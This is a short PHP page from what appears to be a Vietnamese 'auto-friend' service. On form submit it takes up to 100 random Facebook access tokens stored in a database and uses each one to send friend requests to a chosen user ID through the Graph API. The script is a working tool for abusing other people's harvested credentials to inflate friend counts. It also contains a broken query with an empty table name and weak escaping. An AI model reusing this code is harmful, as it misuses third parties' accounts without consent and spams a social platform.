<html lang="vi">
<title>Thanh Cong</title>
	<meta charset="UTF-8">
	<meta http-equiv=refresh content="0; URL=DuySexy.php?Lady=SexyFr">
<meta charset="UTF-8">
<?php
if (isset($_POST['submit'])) 
{
session_start();
include '123config/configg.php';
$token=addslashes($_POST['user']);
$idfr=addslashes($_POST['uid']);
$iduser=$_SESSION['id'];
$name = $_SESSION['name'];
$spam2 = mysql_result(mysql_query("SELECT COUNT(*) FROM `` WHERE `iduser`='".$iduser."'"), 0);
if($iduser !=4){
	$laytoken = mysql_query("SELECT * FROM `autofr` ORDER BY RAND() LIMIT 0,100");

	while ($getpu = mysql_fetch_array($laytoken)){
		$tokenfr= $getpu['access_token'];		
	auto('https://graph.facebook.com/me/friends?uid='.$idfr.'&access_token='.$tokenfr.'&method=post');}
	die('<script>alert("Tăng Friend Thành Công"); </script>');
 } else {	die('<script>alert("Tăng Friend Không Thành Công - AntiSpam"); </script>'); }
}
function auto($url){
   $curl = curl_init();
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
   curl_setopt($curl, CURLOPT_URL, $url);
   $ch = curl_exec($curl);
   curl_close($curl);
   return $ch;
   }
?>
